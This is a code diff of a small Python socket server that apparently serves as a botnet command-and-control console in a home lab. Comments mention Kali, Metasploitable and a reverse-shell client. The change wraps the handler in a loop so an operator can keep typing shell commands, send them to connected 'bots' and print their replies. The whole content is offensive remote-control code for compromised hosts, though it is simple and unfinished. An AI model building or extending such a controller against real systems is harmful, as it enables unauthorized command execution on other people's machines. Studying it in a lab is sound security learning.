@@ -1,5 +1,5 @@
 import socketserver 
-from socket import *
+#from socket import *
 
 #The following are holdovers from shellServer.py:
 #It's possible that running these messes with the multiServer?
@@ -32,27 +32,27 @@ connectionSocket.close()
 
 class BotHandler(socketserver.BaseRequestHandler):
 
+	#Handles the behaviour of the client connection
 	def handle(self):
 		self.data = self.request.recv(1024).strip()
 		print("Bot with IP {} sent:".format(self.client_address[0]))
 		print(self.data)
-		#Now, let's figure out how to get it to send commands instead!
-		command =""
-		command = input("Please enter a command: ")
-		self.request.sendall(command.encode())
-		message = self.request.recv(1024).strip()	
-		print(message)
-
-		#THIS IS WHERE THE ISSUE IS!
-		#This just sends all the received data back in uppercase
-		#So reverseShell on metasploitable is trying to run the
-		# command "BOT REPORTING FOR DUTY" which obviously isn't
-		# a valid command, causing a crash!
-		#self.request.sendall(self.data.upper())
+		#If we don't have the while loop, the connection is "handled"
+		# once, but then once the method ends it just hangs
+		# So, the loop ensures we can keep sending commands, BUT it also
+		# takes up the entire process. 
+		# So, we basically need to multithread
+		#TODO: This will not work if we want to select which bots to send commands to.
+		while True:
+			#Now, let's figure out how to get it to send commands instead!
+			command =""
+			command = input("Please enter a command: ")
+			self.request.sendall(command.encode())
+			message = self.request.recv(1024).strip()	
+			print(message)
 
 if __name__ == "__main__":
-	#IMPORTANT: I thnk you need to change the host IP to whatever your kali machine's IP is
-	HOST, PORT = "192.168.1.101", 8000
+	HOST, PORT = "", 8000
 
 	# This line should remove an error that occurs when we try to reopen the socket quickly after closing it 
 	tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
